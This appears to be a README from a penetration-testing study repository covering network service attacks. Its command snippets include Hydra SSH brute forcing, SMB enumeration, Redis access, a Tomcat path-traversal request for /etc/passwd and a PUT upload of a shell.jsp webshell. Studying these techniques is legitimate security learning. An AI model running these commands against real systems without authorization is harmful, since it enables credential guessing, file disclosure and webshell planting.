# 3-Network-Security

Network-level vulnerabilities, service exploitation, and network reconnaissance.

## Topics Covered

- **SSH Brute Force**: SSH credential enumeration using Hydra
- **SMB/Samba**: SMB protocol vulnerabilities and RCE
- **Redis**: Redis database exploitation (Master-Slave mode)
- **Tomcat**: Tomcat web server vulnerabilities (LFI, PUT method)
- **DNS**: DNS enumeration and manipulation
- **Supervisord**: Supervisord privilege escalation and RCE
- **Exim4**: Mail server RCE vulnerabilities

## Network Scanning

### Nmap Scanning Techniques

```bash
# SMB enumeration
nmap -p 445 --script=smb-os-discovery,smb-protocols [TARGET_IP]

# Service version detection
nmap -sV [TARGET_IP]

# Full TCP scan
nmap -p- [TARGET_IP]

# UDP scanning for DNS
nmap -sU -p 53 [TARGET_IP]
```

## SSH Brute Force

```bash
# Using Hydra
hydra -l username -P passwords.txt ssh://[TARGET_IP]

# With custom port
hydra -l username -P passwords.txt -s 2222 ssh://[TARGET_IP]

# Verbose output
hydra -l username -P passwords.txt -v ssh://[TARGET_IP]
```

## SMB Exploitation

```bash
# Check for known SMB vulnerabilities
nmap -p 445 --script=smb-vuln* [TARGET_IP]

# Enumerate shares
smbmap -H [TARGET_IP]

# List share contents
smbclient //[TARGET_IP]/share
```

## Redis Exploitation

```bash
# Connect to Redis
redis-cli -h [TARGET_IP] -p 6379

# List databases
INFO

# Master-Slave enumeration
INFO replication

# Command execution (if vulnerable)
CONFIG GET dir
SET key value
```

## Tomcat Exploitation

```bash
# Check for LFI
curl http://[TARGET_IP]:8080/examples/servlets/../../etc/passwd

# PUT method upload (if enabled)
curl -X PUT -d @shell.jsp http://[TARGET_IP]:8080/shell.jsp
```

## Quick Commands

```bash
# Find SMB/Samba content
grep -r "SMB\|Samba\|samba" . --include="*.md"

# Find SSH brute force topics
grep -r "SSH\|ssh" . --include="*.md"

# Find Redis content
grep -r "Redis\|redis" . --include="*.md"

# Find Tomcat topics
grep -r "Tomcat\|tomcat" . --include="*.md"

# Find DNS enumeration
grep -r "DNS\|dns" . --include="*.md"
```

## Service-Specific Notes

### SSH (Port 22)
- Default credentials often effective
- Hydra or other tools for brute forcing
- Key-based authentication enumeration

### SMB (Port 445)
- Often misconfigured with open shares
- Legacy versions vulnerable to RCE
- Null session enumeration possible

### Redis (Port 6379)
- Usually unauthenticated access
- Can achieve RCE through cron tasks
- Master-Slave replication exploitation

### Tomcat (Port 8080)
- Default credentials possible
- LFI vulnerabilities in older versions
- PUT method for file upload

## Prerequisites

- nmap
- Hydra
- smbclient
- redis-cli
- curl

## Learning Path

1. Learn network scanning basics
2. Study SMB/Samba vulnerabilities
3. Practice SSH brute forcing
4. Explore database exploitation
5. Master web server vulnerabilities
